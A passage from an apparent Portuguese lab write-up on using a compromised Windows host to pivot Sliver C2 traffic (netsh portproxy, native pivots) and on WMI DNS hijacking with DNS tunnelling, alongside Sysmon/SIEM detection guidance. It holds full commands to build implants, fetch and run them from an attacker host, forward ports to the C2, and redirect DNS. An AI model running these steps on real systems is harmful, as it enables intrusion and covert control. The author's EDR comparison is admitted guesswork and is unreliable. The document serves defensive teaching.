+Uso de máquina comprometida como proxy para rotear tráfego C2 de outros implants.
+
+Dois métodos:
+
+1. **Método A: netsh portproxy** (usa comando nativo do Windows)
+2. **Método B: Sliver Native Pivoting** (stealth, sem comandos Windows)
+
+## Método A: netsh portproxy
+
+### Arquitetura
+
+```mermaid
+graph LR
+    C2[C2 Server<br/>pivot.sandsoncosta.com:443<br/>192.168.223.130]:::internet
+
+    subgraph Pivot["Pivot 192.168.56.10"]
+        P[pivot.exe<br/>Sessão 1] -->|configura| NP[netsh portproxy<br/>0.0.0.0:8080 → 443]
+    end
+
+    subgraph Target["Target 192.168.57.10"]
+        L[lateral.exe<br/>Sessão 2]
+    end
+
+    P -->|"mTLS"| C2
+    L -->|"tcp/8080"| NP
+    NP -->|"forward"| C2
+
+    classDef internet fill:#ff5555,stroke:#c92a2a,color:white
+    classDef pivot   fill:#44ccaa,stroke:#087f5b,color:white
+    classDef target  fill:#77ddcc,stroke:#0ca678,color:black
+    classDef tool    fill:#ffeb3b,stroke:#f08c00,color:black
+
+    class C2 internet
+    class P pivot
+    class L target
+    class NP tool
+```
+
+### Simulação: Método A
+
+#### Passo 1: Configurar C2
+
+```bash
+# Iniciar listener mTLS
+[server] sliver > mtls --lhost 0.0.0.0 --lport 443
+
+[*] Starting mTLS listener ...
+[*] Successfully started job #1
+```
+
+#### Passo 2: Gerar Implant Pivot
+
+```bash
+[server] sliver > generate \
+  --mtls pivot.sandsoncosta.com:443 \
+  --os windows \
+  --arch amd64 \
+  --save /tmp/pivot_netsh.exe \
+  --skip-symbols
+
+[*] Generating new windows/amd64 implant binary
+[!] Symbol obfuscation is disabled
+[*] Build completed in 2s
+[*] Implant saved to /tmp/pivot_netsh.exe
+```
+
+#### Passo 3: Executar na Máquina Pivot
+
+```powershell
+# Máquina Pivot (192.168.56.10)
+mkdir "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft Update"
+cd "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft Update"
+iwr -Uri "http://192.168.223.137:8080/pivot_netsh.exe" -OutFile "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft Update\pivot.exe"
+.\pivot.exe
+```
+
+```bash
+# Verificar session
+[*] Session 55bfb2f6 AFRAID_ATTORNEY - 192.168.223.149:54837 (kingslanding) - windows/amd64 - Sat, 17 Jan 2026 13:16:23 EST
+
+[server] sliver > sessions
+
+ ID         Name              Transport   Remote Address          Hostname       Username                         Operating System   Locale   Last Message                             Health
+========== ================= =========== ======================= ============== ================================ ================== ======== ======================================== =========
+ 55bfb2f6   AFRAID_ATTORNEY   mtls        192.168.223.149:54837   kingslanding   SEVENKINGDOMS\robert.baratheon   windows/amd64      en-US    Sat Jan 17 13:16:23 EST 2026 (10s ago)   [ALIVE]
+```
+
+#### Passo 4: Configurar netsh portproxy
+
+```bash
+[server] sliver > use 55bfb2f6
+[*] Active session AFRAID_ATTORNEY (55bfb2f6-5f2c-48eb-a50e-39b6a95e798e)
+
+[server] sliver (AFRAID_ATTORNEY) > shell
+# kkkkk o C2 é brincante
+? This action is bad OPSEC, are you an adult? Yes
+[*] Wait approximately 10 seconds after exit, and press <enter> to continue
+[*] Opening shell tunnel (EOF to exit) ...
+[*] Started remote shell with pid 2972
+```
+```powershell
+# Dentro do PowerShell via C2
+PS C:\Users\robert.baratheon\AppData\Roaming\Microsoft Update> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+
+PS C:\Users\robert.baratheon\AppData\Roaming\Microsoft Update> netsh interface portproxy show all
+netsh interface portproxy show all
+
+Listen on ipv4:             Connect to ipv4:
+
+Address         Port        Address         Port
+--------------- ----------  --------------- ----------
+0.0.0.0         8080        pivot.sandsoncosta.com 443
+
+PS C:\Users\robert.baratheon\AppData\Roaming\Microsoft Update>
+```
+
+#### Passo 5: Configurar Firewall (Opcional)
+
+```powershell
+PS C:\Users\robert.baratheon\AppData\Roaming\Microsoft Update> netsh advfirewall firewall add rule name="Pivot Port 8080" dir=in action=allow protocol=TCP localport=8080
+PS C:\Users\robert.baratheon\AppData\Roaming\Microsoft Update> exit
+```
+
+#### Passo 6: Gerar Implant lateral
+
+```bash
+# Conecta ao IP do pivot na porta do portproxy
+[server] sliver > generate \
+  --mtls 192.168.56.10:8080 \
+  --os windows \
+  --arch amd64 \
+  --save /tmp/lateral_netsh.exe \
+  --skip-symbols
+
+[*] Generating new windows/amd64 implant binary
+[*] Build completed in 2s
+[*] Implant saved to /tmp/lateral_netsh.exe
+[*] C2 URL: mtls://192.168.56.10:8080
+```
+
+#### Passo 7: Executar na Target
+
+```powershell
+# Máquina Target (192.168.57.10)
+.\lateral.exe
+```
+
+#### Passo 8: Verificar Sessões
+
+```bash
+[server] sliver > sessions
+
+ ID         Name              Transport   Remote Address          Hostname       Username                         Operating System   Locale   Last Message                               Health
+========== ================= =========== ======================= ============== ================================ ================== ======== ========================================== =========
+ 47342346   AFRAID_ATTORNEY   mtls        192.168.223.149:54964   kingslanding   SEVENKINGDOMS\robert.baratheon   windows/amd64      en-US    Sat Jan 17 14:55:07 EST 2026 (1m43s ago)   [ALIVE]
+ b7c7f060   DRAMATIC_ARROW    mtls        192.168.223.149:55047   winterfell     NORTH\robb.stark                 windows/amd64      en-US    Sat Jan 17 14:56:21 EST 2026 (29s ago)     [ALIVE]
+                                          ↑ Tráfego encaminhado via netsh
+[server] sliver >
+```
+
+---
+#### Detecção no SIEM
+
+##### Detecção do **Passo 3**
+
+Neste cenário, é muito importante o uso do Sysmon, com ele você consegue detectar até melhor que o próprio log nativo do Windows, por meio dos logs de DNS, este, gera muito log. É importante detectar conexões a partir de pastas incomuns, como `AppData`, `Temp`, `C:/Temp`, `C:/temp`, `C:/tmp`, `C:/TMP`, `user Public`.
+
+<figure style="text-align: center;">
+  <img src="image-2.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 6. </strong>Detecção via Sysmon.</i></figcaption>
+</figure>
+
+##### Detecção do **Passo 4**
+
+A regra da **Técnica 3: Netsh Port Forwarding** já captura esse cenário.
+
+##### Detecção do **Passo 7**
+
+Existe a possibilidade de gerar muitos falsos-positivos devido a aplicações internas. Nesse tipo de situação, o ideal é analisar o ambiente e ver se faz sentido desenvolver alguma regra e/ou incluir exceções na regra.
+
+<figure style="text-align: center;">
+  <img src="image-3.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 7. </strong>Detecção via Sysmon.</i></figcaption>
+</figure>
+
+## Método B: Sliver Native Pivoting
+
+### Arquitetura
+
+```mermaid
+graph TB
+    subgraph Internet
+        C2[C2 Server<br/>pivot.sandsoncosta.com<br/>192.168.223.130:443]
+    end
+    
+    subgraph "Máquina Pivot<br>192.168.56.10"
+        sp1[" "]
+        PivotA[pivot.exe<br/>Session 1]
+        ListenerA[Sliver TCP Listener<br/>0.0.0.0:9898]
+        sp1 ~~~ PivotA
+        PivotA -->|"Cria"| ListenerA
+    end
+    
+    subgraph "Máquina Target<br>192.168.57.10"
+        sp2[" "]
+        LateralA[lateral.exe<br/>Session 2]
+        sp2 ~~~ LateralA
+    end
+    
+    PivotA -->|"mTLS:443"| C2
+    LateralA -->|"TCP:9898"| ListenerA
+    ListenerA -.->|"Tunel"| PivotA
+    
+    style C2 fill:#ff6b6b,stroke:#c92a2a,color:#fff
+    style PivotA fill:#4ecdc4,stroke:#087f5b,color:#fff
+    style LateralA fill:#95e1d3,stroke:#0ca678,color:#000
+    style sp1 fill:none,stroke:none,height:20px
+    style sp2 fill:none,stroke:none,height:20px
+```
+
+### Simulação: Método B
+
+#### Passo 1: Configurar C2
+
+```bash
+# Iniciar listener mTLS
+[server] sliver > mtls --lhost 0.0.0.0 --lport 443
+
+[*] Starting mTLS listener ...
+[*] Successfully started job #1
+
+[server] sliver > jobs
+
+ ID   Name   Protocol   Port   Stage Profile
+==== ====== ========== ====== ===============
+ 1    mtls   tcp        443
+```
+
+#### Passo 2: Gerar Implant Pivot
+
+```bash
+[server] sliver > generate \
+  --mtls pivot.sandsoncosta.com:443 \
+  --os windows \
+  --arch amd64 \
+  --save /tmp/pivot_native.exe \
+  --skip-symbols
+
+[*] Generating new windows/amd64 implant binary
+[!] Symbol obfuscation is disabled
+[*] Build completed in 2s
+[*] Implant saved to /tmp/pivot_native.exe
+```
+
+#### Passo 3: Executar na Máquina Pivot
+
+```powershell
+# Máquina Pivot (192.168.56.10)
+PS C:\Temp> .\pivot_native.exe
+```
+
+```bash
+# Verificar session
+[server] sliver > sessions
+
+# Aqui eu listo todas as sessions que testamos até o momento.
+ ID         Name                  Transport   Remote Address          Hostname       Username                         Operating System   Locale   Last Message                               Health
+========== ===================== =========== ======================= ============== ================================ ================== ======== ========================================== =========
+ 12210d77   DRAMATIC_ARROW        mtls        192.168.223.149:56048   winterfell     NORTH\robb.stark                 windows/amd64      en-US    Sat Jan 17 19:48:18 EST 2026 (1m27s ago)   [ALIVE]
+ 3a420a8c   AFRAID_ATTORNEY       mtls        192.168.223.149:56046   kingslanding   SEVENKINGDOMS\robert.baratheon   windows/amd64      en-US    Sat Jan 17 19:48:01 EST 2026 (1m44s ago)   [ALIVE]
+ 5d1b9c10   CONVINCING_FOOTNOTE   mtls        192.168.223.149:56045   kingslanding   SEVENKINGDOMS\robert.baratheon   windows/amd64      en-US    Sat Jan 17 19:49:33 EST 2026 (12s ago)     [ALIVE]
+ b44f0872   ICY_LOGIC             mtls        192.168.223.149:56103   kingslanding   SEVENKINGDOMS\robert.baratheon   windows/amd64      en-US    Sat Jan 17 19:48:54 EST 2026 (51s ago)     [ALIVE]
+ d0450fea   DRAMATIC_ARROW        mtls        192.168.223.149:56043   winterfell     NORTH\robb.stark                 windows/amd64      en-US    Sat Jan 17 19:49:33 EST 2026 (12s ago)     [ALIVE]
+
+[server] sliver >
+```
+
+#### Passo 4: Criar Listener Nativo
+
+Esse passo do listener nativo, não gera nenhum log no windows, das informações que comumente todo SOC captura, que geralmente são eventos de Security, Application (nem sempre), System (nem sempre). Essa informação é capturada, porém com uma auditoria específica, que falamos na sessão **ESCREVER A SESSÃO AQUI**.
+
+```bash
+[server] sliver > use b44f0872
+
+[*] Active session ICY_LOGIC (b44f0872-8022-4140-85a1-3b2928abde38)
+
+[server] sliver (ICY_LOGIC) > pivots tcp
+
+[*] Started tcp pivot listener :9898 with id 1
+
+[server] sliver (ICY_LOGIC) > pivots
+
+ ID   Protocol   Bind Address   Number Of Pivots
+==== ========== ============== ==================
+  1   TCP        :9898                         0
+```
+
+#### Passo 5: Gerar Implant Lateral
+
+```bash
+# Conecta ao IP INTERNO do pivot
+[server] sliver > generate \
+  --mtls 192.168.56.10:9898 \
+  --os windows \
+  --arch amd64 \
+  --save /tmp/lateral_native.exe \
+  --skip-symbols
+
+[*] Generating new windows/amd64 implant binary
+[*] Build completed in 2s
+[*] Implant saved to /tmp/lateral_native.exe
+[*] C2 URL: mtls://192.168.56.10:9898
+```
+
+#### Passo 6: Executar na Target
+
+```powershell
+# Máquina Target (192.168.57.10)
+PS C:\Windows\Temp> .\lateral_native.exe
+```
+
+#### Passo 7: Verificar Sessões
+
+```bash
+[server] sliver (ICY_LOGIC) > sessions
+
+ ID         Name                  Transport   Remote Address          Hostname       Username                         Operating System   Locale   Last Message                               Health
+========== ===================== =========== ======================= ============== ================================ ================== ======== ========================================== =========
+ 12210d77   DRAMATIC_ARROW        mtls        192.168.223.149:56048   winterfell     NORTH\robb.stark                 windows/amd64      en-US    Sat Jan 17 20:11:44 EST 2026 (25s ago)     [ALIVE]
+ 3a420a8c   AFRAID_ATTORNEY       mtls        192.168.223.149:56046   kingslanding   SEVENKINGDOMS\robert.baratheon   windows/amd64      en-US    Sat Jan 17 20:12:01 EST 2026 (8s ago)      [ALIVE]
+ 5d1b9c10   CONVINCING_FOOTNOTE   mtls        192.168.223.149:56045   kingslanding   SEVENKINGDOMS\robert.baratheon   windows/amd64      en-US    Sat Jan 17 20:11:34 EST 2026 (35s ago)     [ALIVE]
+ d0450fea   DRAMATIC_ARROW        mtls        192.168.223.149:56043   winterfell     NORTH\robb.stark                 windows/amd64      en-US    Sat Jan 17 20:11:33 EST 2026 (36s ago)     [ALIVE]
+ b44f0872   ICY_LOGIC             mtls        192.168.223.149:56103   kingslanding   SEVENKINGDOMS\robert.baratheon   windows/amd64      en-US    Sat Jan 17 20:10:12 EST 2026 (1m57s ago)   [ALIVE]
+```
+
+Esses últimos passos são os mesmos do **Método A**.
+
+## Comparação dos Métodos
+
+| Aspecto | Método A (netsh) | Método B (Native) |
+|---------|------------------|-------------------|
+| **Comandos Windows** | `netsh` detectável | Nenhum (Se levar em consideração os Channels mais comuns de coleta no Windows) |
+| **Logs do Windows** | `Event 4688` (netsh), `5156` (firewall - falarei mais na frente sobre esse EID.) | Minimal |
+| **Persistência** | Sobrevive a reboot | Morre se pivot reiniciar (carece de outras técnicas) |
+| **Stealth** | Média | Alta |
+| **Facilidade** | Fácil | Moderada |
+| **Performance** | Adicional hop (netsh) | Melhor (túnel direto) |
+| **Detecção EDR** | Fácil (assinatura de comando) | Difícil |
+
+Sobre a detecção de EDR, eu tô chutando no escuro. Não tenho experiências reais de Pentest e nem tenho EDR pra testar... Na verdade tenho o EDR da Elastic Security, mas não cheguei a ver isso não... O artigo já tá muito extenso... Vou deixar essa parte para comentários dos meus colegas da área que claramente tem mais experiência que eu em pentest real. 
+
+## Evidências Forenses
+
+Durante a **Resposta a Incidentes**, comandos como `netsh interface portproxy show all` para identificar proxys configurados, comandos como `netstat -ano | findstr 8080` para identificar conexões a portas suspeitas. Uso de ferramentas como Process Explorer ou System Informer (conforme **Figura 8**), são extremamente importantes para identificação de algum agente malicioso.
+
+<figure style="text-align: center;">
+  <img src="image-6.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 8. </strong>Identificação de conexão via System Informer.</i></figcaption>
+</figure>
+
+
+## Ponto de alerta
+
+E se eu fizesse o pivoting em `localhost:8080`? O que aconteceria?
+
+Eu configuro o `protproxy` para `localhost:8080` e gero o _implant_ para `localhost`. Como eu consigo capturar isso?
+
+Em teoria, eu deveria ver alguma conexão via EID 3 ou EID 22, certo?
+
+Veja como se comporta o log quando testamos a configuração neste modelo:
+
+<figure style="text-align: center;">
+  <img src="image-7.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 9. </strong>A conexão localhost não gera a porta de conexão nativa configurada no portproxy, como podemos ver.</i></figcaption>
+</figure>
+
+Via EID 22, podemos ver que ele se conectou ao próprio ip, digamos que não foi "localmente".
+
+Via EID 3, vemos que ele se conecta nas portas `135`e `49668`, portas de uso do RPC.
+
+E aqui entra a curiosidade técnica, ponto de alerta e um "enorme" blind spot de detecção...
+
+### Limitações de detecção via Sysmon
+
+#### Por que a conexão para `localhost:8080` não aparece nos logs?
+
+O **netsh portproxy** opera em **nível de kernel** através do serviço IP Helper (iphlpsvc - ver **Figura 8**), fazendo o redirecionamento de porta **antes** que o tráfego seja visível como uma conexão TCP tradicional no `usermode`, onde o Sysmon monitora.
+
+**Fluxo técnico:**
+
+```mermaid
+graph TD
+    A[local.exe] -->|Tenta conectar<br>192.168.56.10:8080| B[netsh portproxy intercepta no kernel via iphlpsvc]
+    B -->|Reescreve destino para pivot.sandsoncosta.com:443| C[Conexão sai diretamente para 192.168.223.130:443]
+    
+    style A fill:#ff6b6b,stroke:#c92a2a,color:#fff
+    style B fill:#4ecdc4,stroke:#087f5b,color:#fff
+    style C fill:#ffeb3b,stroke:#f08c00,color:black
+```
+
+O Sysmon captura conexões através do Event Tracing for Windows (ETW) em nível de kernel, porém o redirecionamento feito pelo `netsh portproxy` acontece em uma camada INFERIOR, através do driver do IP Helper Service (iphlpsvc), antes que o ETW consiga capturar.
+
+**O que você NÃO verá nos logs do Windows:**
+
+- Conexão para `192.168.56.10:8080` (porta do portproxy)
+- Conexão para `192.168.223.130:443` (IP final do C2)
+- Qualquer evidência da conexão real de C2 no Sysmon Event ID 3
+
+**O que você VAI ver nos logs do Windows:**
+
+- Conexões RPC/DCOM locais (portas 135, 49668+) - tentativas automáticas de resolução
+- Queries DNS para o hostname local ou do domínio (Sysmon Event ID 22)
+- Execução do processo suspeito em pasta incomum (Sysmon Event ID 1)
+- Modificação do registro PortProxy (Sysmon Event ID 13)
+
+**O que você SÓ verá no Firewall/NGFW:**
+
+- Conexão real `192.168.56.10 → 192.168.223.130:443` após o redirecionamento
+- Tráfego saindo da rede com origem no IP do pivot
+
+#### Conexões RPC/DCOM (portas 135, 49668)
+
+Essas são **tentativas automáticas de resolução RPC** do Windows antes de estabelecer a conexão principal:
+
+- **Porta 135 (epmap)**: RPC Endpoint Mapper - o Windows tenta mapear serviços RPC locais
+- **Porta 49668+**: Portas dinâmicas RPC (range 49152-65535)
+
+Isso acontece porque o implant está rodando no contexto de um usuário do domínio e o Windows tenta automaticamente resolver alguns serviços locais antes de fazer a conexão externa.
+
+**IMPORTANTE:** Essas são as ÚNICAS conexões de rede que você verá no Sysmon Event ID 3 para o processo `local.exe`. A conexão real para o C2 (`192.168.223.130:443`) **NÃO aparece** no Sysmon porque o redirecionamento via portproxy acontece em nível inferior ao monitoramento do ETW.
+
+#### Detecção avançada via Windows Filtering Platform (WFP)
+
+##### Habilitando auditoria de conexões em nível de kernel
+
+É possível capturar o redirecionamento de porta em nível de kernel habilitando auditoria da **Windows Filtering Platform (WFP)**. Contudo, **essa abordagem NÃO é recomendada para produção devido ao volume massivo de logs gerados**.
+
+##### Configuração via GPO
+
+```yml
+Computer Configuration
+└── Policies
+    └── Windows Settings
+        └── Security Settings
+            └── Advanced Audit Policy Configuration
+                └── System Audit Policies
+                    └── Object Access
+                        ├── Audit Filtering Platform Connection
+                        └── Audit Filtering Platform Policy Change
+```
+
+##### Event IDs Gerados (Channel: Security)
+
+| Event ID | Descrição | Utilidade |
+|----------|-----------|-----------|
+| **5156** | WFP permitiu conexão | Captura TODAS as conexões permitidas, incluindo redirecionamentos |
+| **5157** | WFP bloqueou conexão | Útil para detectar tentativas bloqueadas pelo firewall |
+| **5158** | WFP permitiu bind em porta local | Detecta quando aplicação abre porta de escuta |
+| **5031** | Firewall bloqueou aplicação | Aplicação tentou conexão mas foi bloqueada |
+
+##### Exemplo de Event ID 5156
+
+```yml
+The Windows Filtering Platform has permitted a connection.
+
+Application Information:
+	Process ID:		6272
+	Application Name:	\device\harddiskvolume2\users\robert.baratheon\appdata\roaming\microsoft update\local.exe
+
+Network Information:
+	Direction:		Outbound
+	Source Address:		127.0.0.1
+	Source Port:		56044
+	Destination Address:	127.0.0.1
+	Destination Port:		8080
+	Protocol:		6
+
+Filter Information:
+	Filter Run-Time ID:	93535
+	Layer Name:		Connect
+	Layer Run-Time ID:	48
+```
+
+#### ALERTA CRÍTICO: Volume de logs insustentável
+
+Durante os testes com **apenas 1 VM Windows**, a habilitação da auditoria WFP gerou:
+
+- **700.000+ eventos em 5 minutos**
+- **~2.333 eventos por segundo**
+- **~140.000 eventos por minuto**
+
+**Projeção para ambiente corporativo:**
+
+| Cenário | Quantidade de Hosts | Eventos/Hora | Eventos/Dia | Impacto |
+|---------|---------------------|--------------|-------------|---------|
+| Lab (1 VM) | 1 | 8.4 milhões | 201 milhões | Insustentável |
+| Pequena Empresa | 50 | 420 milhões | 10 bilhões | SIEM vai de arrasta |
+| Média Empresa | 500 | 4.2 bilhões | 100 bilhões | Impossível armazenar |
+| Grande Empresa | 5000 | 42 bilhões | 1 trilhão | Catastrófico |
+
+##### Por que tantos logs?
+
+O Event ID 5156 registra **TODAS** as conexões de rede permitidas pelo firewall, incluindo:
+
+- Conexões legítimas de navegadores (HTTP/HTTPS)
+- Atualizações do Windows Update
+- Sincronização de Active Directory
+- Replicação de serviços
+- Heartbeats de aplicações
+- DNS queries
+- SMB/CIFS file sharing
+- RPC/DCOM interno
+- Telemetria do Windows
+- Comunicação entre serviços do sistema
+
+## Abordagem recomendada: detecção multi-camada
+
+### Estratégia 1: detecção baseada em comportamento (sem WFP audit)
+
+Como demonstrado nos logs reais, **o Sysmon Event ID 3 NÃO captura a conexão final ao C2** quando há redirecionamento via `portproxy`. Por isso, a detecção deve ser baseada em **correlação de múltiplos indicadores** e **logs de firewall/NGFW** para ver o tráfego real.
+
+Em vez de habilitar WFP audit globalmente, utilize **detecção baseada em comportamento** combinando múltiplas fontes de log, inclusão de **Sysmon Event ID 13** - Modificação de Registro, que não foi tratado aqui, mas identifica alteração no registro de `PortProxy`.
+
+Correlacionar IPs internos que geram tráfego externo suspeito com processos em pastas anômalas detectados pelo Sysmon.
+
+**Lógica da detecção:**
+
+1. **Windows Event ID 13**: Detecta configuração do portproxy
+2. **Windows Event ID 1**: Detecta processo suspeito executando
+3. **Firewall Logs**: Detecta tráfego saindo do host pivot para IP externo
+4. **Correlação temporal**: Eventos ocorrem em janela de 5 minutos
+5. **Correlação por host**: Mesmo hostname/IP em Windows e Firewall
+
+### Estratégia 2: WFP Audit seletivo (apenas hosts críticos)
+
+Se você **REALMENTE precisa** de logs WFP, habilite **APENAS** em:
+
+**Hosts elegíveis:**
+- Servidores DMZ
+- Jump servers / Bastion hosts
+- Servidores com acesso externo controlado
+- Máquinas de administradores privilegiados
+
+Eu consultei aqui quanto de log total gerou desde a habilitação do log e deu mais de 18 milhões de eventos de apena um único host! 🤣
+
+É muita loucura!!!
+
+Eu filtrei somente por logs da pasta onde eu executei o arquivo e gerou 887 eventos. Bem... Julgando que pastas incomuns como tratados mais acima, talvez seja válido enviar ao SIEM e configurar um `filter` no coletor para enviar somente logs suficientemente necessários.
+
+**Redução esperada de volume:** ~95% (filtrando apenas processos em pastas suspeitas ou portas específicas)
+
+### Estratégia 3: Uso de EDR/XDR Comercial
+
+Soluções EDR/XDR modernas conseguem capturar atividade em nível de kernel **sem** gerar volume massivo de logs porque:
+
+1. Processam eventos localmente no agente
+2. Aplicam ML/AI para filtrar ruído
+3. Enviam apenas eventos suspeitos para console central
+4. Fazem análise comportamental em tempo real
+
+**Exemplos:**
+- Microsoft Defender for Endpoint
+- CrowdStrike Falcon
+- SentinelOne
+- Carbon Black
+- Cortex XDR
+
+# Técnica 7: WMI DNS Hijacking com DNS C2
+
+<kbd>**MITRE ATT&CK:** T1557.002 (Adversary-in-the-Middle: ARP Cache Poisoning)</kbd><br>
+<kbd>**MITRE ATT&CK:** T1071.004 (Application Layer Protocol: DNS)</kbd>
+
+## O que é?
+
+Modificação de configurações DNS via WMI para redirecionar tráfego para servidor DNS malicioso, que também funciona como canal de C2 via DNS tunneling.
+
+## Como funciona?
+
+```mermaid
+graph LR
+    A[Vítima] -->|DNS Query| B[DNS Malicioso = C2]
+    B -->|Resposta com dados C2| A
+    A -->|Resolve domínios para IPs maliciosos| C[( )]
+    B -->|Extrai comandos via subdomínios/TXT records| D[( )]
+    
+    style A fill:#ff6b6b,stroke:#c92a2a,color:#fff
+    style B fill:#4ecdc4,stroke:#087f5b,color:#fff
+    style C fill:#ff6b6b,stroke:#c92a2a,color:#fff
+    style D fill:#95e1d3,stroke:#0ca678,color:#000
+```
+
+## Por que é perigoso?
+
+- Redireciona TODO tráfego DNS da máquina
+- Permite Man-in-the-Middle de qualquer conexão
+- DNS C2 bypassa firewalls (porta 53 sempre aberta)
+- Difícil detectar sem monitoramento DNS ativo
+- Persistente (permanece após reboot)
+
+## Passo a passo
+
+### Passo 1: Reconhecimento - Identificar interfaces ativas
+
+```powershell
+# Listar todas as interfaces com IP
+Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select-Object Description, IPAddress, DNSServerSearchOrder, Index
+
+Description                                   IPAddress       DNSServerSearchOrder          Index
+-----------                                   ---------       --------------------          -----
+Intel(R) 82574L Gigabit Network Connection #2 {192.168.57.10} {192.168.57.5, 192.168.56.10}     2
+```
+
+**O que observar:**
+- `Description`: Nome da interface (Ethernet, Wi-Fi, etc)
+- `IPAddress`: IP atual da máquina
+- `DNSServerSearchOrder`: Servidores DNS atuais ← **NOSSO ALVO**
+- `Index`: Índice da interface (guardar para próximo passo)
+
+### Passo 2: Modificar DNS via WMI (método stealth)
+
+```powershell
+PS C:\Windows\system32> $nic = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "Index=2"
+PS C:\Windows\system32> $result = $nic.SetDNSServerSearchOrder(@("192.168.223.130", "8.8.8.8"))
+PS C:\Windows\system32> if ($result.ReturnValue -eq 0) {
+>>     Write-Host "[+] DNS alterado com sucesso" -ForegroundColor Green
+>> } else {
+>>     Write-Host "[-] Falha (código: $($result.ReturnValue))" -ForegroundColor Red
+>> }
+[+] DNS alterado com sucesso
+PS C:\Windows\system32>
+```
+
+### Passo 3: Persistência via Registry
+
+```powershell
+# Método 1: Encontrar GUID da interface ativa
+$adapter = Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1
+$interfaceGuid = $adapter.InterfaceGuid
+
+# Caminho do registro
+$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$interfaceGuid"
+
+# Modificar DNS no registro (sobrevive a reboot)
+Set-ItemProperty -Path $regPath -Name NameServer -Value "192.168.223.130,8.8.8.8"
+Set-ItemProperty -Path $regPath -Name DhcpNameServer -Value "192.168.223.130,8.8.8.8"
+```
+
+**Verificar persistência:**
+```powershell
+Get-ItemProperty -Path $regPath | Select-Object NameServer, DhcpNameServer
+```
+
+### Passo 4: Métodos alternativos de DNS Hijacking
+
+#### **4.1 - Via netsh (linha de comando)**
+
+```cmd
+netsh interface ip set dns name="Ethernet" static 192.168.1.50 primary
+netsh interface ip add dns name="Ethernet" 8.8.8.8 index=2
+```
+
+**Vantagem:** Uso do `netsh` no `CMD` funciona caso o PowerShell esteja bloqueado.
+
+#### **4.2 - Via hosts file (para domínios específicos)**
+
+```powershell
+# Adicionar entrada no hosts
+$hostsPath = "C:\Windows\System32\drivers\etc\hosts"
+Add-Content -Path $hostsPath -Value "`n192.168.1.50  google.com www.google.com"
+```
+
+**Caso de uso:** Redirecionar apenas domínios críticos sem alterar DNS global
+
+#### **4.3 - Via DHCP Option Injection (rede comprometida)**
+
+```powershell
+# Modificar opções DHCP na interface
+$nic = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
+$nic.SetDynamicDNSRegistration($false, $false)
+$nic.SetDNSServerSearchOrder(@("192.168.1.50"))
+```
+
+## 🖥️ Configurando Servidor DNS C2 com Sliver
+
+### Passo 1: Iniciar listener DNS no Sliver
+
+```bash
+# No servidor Sliver
+[server] sliver > dns --domains pivot.sandsoncosta.com --no-canaries
+
+[*] Starting DNS listener with parent domain(s) [pivot.sandsoncosta.com.] ...
+
+[*] Successfully started job #1
+
+[server] sliver > jobs
+
+ ID   Name   Protocol   Port   Stage Profile
+==== ====== ========== ====== ===============
+ 1    dns    udp        53
+
+[server] sliver >
+```
+
+**O que está acontecendo?**
+- Sliver está escutando na porta 53 (DNS)
+- Qualquer query para `*.pivot.sandsoncosta.com` será processada
+- Comandos C2 serão enviados via subdomínios codificados
+
+### Passo 2: Gerar implant com DNS C2
+
+```bash
+sliver > generate --dns pivot.sandsoncosta.com \
+                  --os windows \
+                  --arch amd64 \
+                  --format exe \
+                  --save /tmp/dns-implant.exe
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 30s
+[*] Implant saved to /tmp/dns-implant.exe
+```
+
+### Passo 3: Como o DNS Tunneling funciona
+
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Implant as Implant<br/>(Máquina Comprometida)
+    participant DNS as DNS Resolver<br/>(192.168.223.130)
+    participant C2 as Servidor C2<br/>(pivot.sandsoncosta.com)
+    
+    rect rgb(40, 40, 60)
+        Note over Implant,C2: FASE 1: EXFILTRAÇÃO DE COMANDO VIA DNS QUERY
+    end
+    
+    Note right of Implant: Prepara comando para envio:<br/>- Comando: whoami<br/>- Encoding: Base64<br/>- Session ID: session123
+    
+    Implant->>DNS: DNS Query (Type A)
+    Note right of Implant: Query Name:<br/>whoami.aGVsbG8=.session123.pivot.sandsoncosta.com
+    
+    activate DNS
+    DNS->>C2: Forward DNS Query
+    Note over DNS,C2: Roteamento normal de DNS
+    deactivate DNS
+    
+    activate C2
+    Note over C2: Servidor C2 Processa:<br/>1. Extrai subdomínios<br/>2. Decodifica Base64<br/>3. Identifica sessão<br/>4. Executa comando<br/>5. Prepara resposta
+    
+    rect rgb(40, 60, 40)
+        Note over Implant,C2: FASE 2: INFILTRAÇÃO DE RESPOSTA VIA TXT RECORD
+    end
+    
+    C2->>DNS: DNS Response (Type TXT)
+    Note left of C2: TXT Record:<br/>"desktop-pc\admin"<br/>(Resultado do comando whoami)
+    
+    activate DNS
+    DNS->>Implant: DNS Response com TXT
+    deactivate DNS
+    deactivate C2
+    
+    Note left of Implant: Implant processa:<br/>1. Extrai TXT record<br/>2. Parseia resultado<br/>3. Aguarda próximo comando
+    
+    rect rgb(60, 40, 40)
+        Note over Implant,C2: CICLO CONTINUA COM PRÓXIMOS COMANDOS
+    end
+    
+    Implant->>DNS: Próxima Query...
+    Note right of Implant: ls.c2Vzc2lvbg==.session123.pivot.sandsoncosta.com
+```
+
+### Passo 4: Executar implant na vítima
+
+```powershell
+# Na máquina vítima (com DNS hijackado)
+.\dns-implant.exe
+
+# O implant tentará resolver:
+# beacon.pivot.sandsoncosta.com
